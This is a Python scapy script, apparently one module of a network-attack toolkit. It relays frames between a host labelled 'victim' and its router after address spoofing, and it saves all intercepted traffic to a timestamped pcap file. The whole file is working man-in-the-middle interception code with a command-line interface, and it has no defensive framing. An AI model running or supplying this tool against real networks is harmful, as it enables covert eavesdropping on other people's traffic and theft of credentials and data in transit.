import scapy.all as scapy
from scapy.all import IP, Ether
from scapy.all import PcapWriter, sniff
from datetime import datetime


import sys, os
sys.path.append(os.path.join('..','..'))
from config import *

ip_dst = ''
mac_dst = ''
ip_src = ''
mac_src = ''
iface = scapy.conf.iface
my_ip = scapy.get_if_addr(iface)
my_mac = scapy.get_if_hwaddr(iface)

def addr_spoof(packet):
    global ip_dst, mac_dst, ip_src, mac_src, iface
    #Norm 192.168.100.8:dst_mac   ->   23.23.23.23:src_mac 
    #Norm 23.23.23.23:src_mac     ->   192.168.100.1:dst_mac
    
    #Spof 192.168.100.8:dst_mac   ->   23.23.23.23:my_mac
    #Spof 23.23.23.23:my_mac      ->   192.168.100.1:dst_mac
    if packet.haslayer(IP) and packet.haslayer(Ether):
        
        # Пакет ОТ жертвы → отправляем на роутер
        if packet[Ether].src == mac_dst and packet[Ether].dst == my_mac:
            packet[Ether].dst = mac_src
            scapy.sendp(packet, iface=iface, verbose=0)
            print(f"[->] {packet[IP].src} -> {packet[IP].dst} (переслано на роутер)")

        # Пакет К жертве → отправляем жертве
        elif packet[IP].dst == ip_dst and packet[Ether].dst == my_mac:
            packet[Ether].dst = mac_dst
            packet[Ether].src = my_mac
            scapy.sendp(packet, iface=iface, verbose=0)
            print(f"[<-] {packet[IP].src} -> {packet[IP].dst} (переслано жертве)")

def ip_forward(args):
    global ip_dst, mac_dst, ip_src, mac_src
    if not validate_args(ip_dst=args['ip_dst'], mac_dst=args['mac_dst'], ip_src=args['ip_src'], mac_src=args['mac_src']): return False
    ip_dst = args['ip_dst']
    mac_dst = args['mac_dst']
    ip_src = args['ip_src']
    mac_src = args['mac_src']
    
    
    
    
    now = datetime.now()
    filename = f'ip_forwarding_{now.strftime("%Y%m%d_%H%M%S")}.pcap'
    
    try:
        pcap_writer = PcapWriter(filename=filename, append=False, sync=True)
    except Exception:
        filename = f'ip_forwarding_{now.strftime("%Y%m%d_%H%M%S")}.pcap'
        pcap_writer = PcapWriter(filename=filename, append=False, sync=True)
    
    print("IP forwarding, version: 2.0")
    print('*IP forwarding started')
    print(f'Router: {ip_src}_{mac_src}')
    print(f'Victim: {ip_dst}_{mac_dst}')
    
    forwarded_packets = scapy.sniff(filter='ip', prn=addr_spoof, store=True, iface=args['iface'])
    pcap_writer.write(forwarded_packets)
    print(f'\n{Success}Traffic was writted in \'{filename}\'{Clear}')

if __name__ == '__main__':
    
    import argparse
    parser = argparse.ArgumentParser(description="IP forwarding module.")
    parser.add_argument("--ip_dst", "-id", help="Destination IP address (target 2).", required=True)
    parser.add_argument("--mac_dst", "-md", help="Destination MAC address (target 2).", required=True)
    parser.add_argument("--ip_src", "-is", help="Sender IP address (target 1).", required=True)
    parser.add_argument("--mac_src", "-ms", help="Sender MAC address (target 1).", required=True)
    parser.add_argument("-i", "--iface", help="Network iface to send from.", required=False)

    arg = parser.parse_args()
    args = {}
    args['ip_dst'] = arg.ip_dst
    args['mac_dst'] = arg.mac_dst
    args['ip_src'] = arg.ip_src
    args['mac_src'] = arg.mac_src
    args['iface'] = arg.iface
    ip_forward(args)
